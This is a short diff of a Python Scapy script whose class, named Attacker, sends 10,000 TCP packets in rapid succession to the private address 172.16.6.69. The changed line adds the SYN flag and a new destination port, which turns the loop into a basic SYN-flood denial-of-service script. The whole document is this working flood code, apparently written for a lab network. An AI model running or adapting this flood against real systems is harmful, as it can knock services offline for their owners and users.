@@ -24,7 +24,7 @@ class Attacker:
         i = 1
         while i < self.amount:
             IP1 = IP(dst=self.target)
-            TCP1 = TCP(dport=28588) / Raw(load='tom')
+            TCP1 = TCP(dport=8909,flags="S") / Raw(load='tom')
             pkt = IP1 / TCP1
             send(pkt, inter=.0001)
 
@@ -34,4 +34,3 @@ class Attacker:
 
 a = Attacker("172.16.6.69", 10000)
 a.send_packets()
-
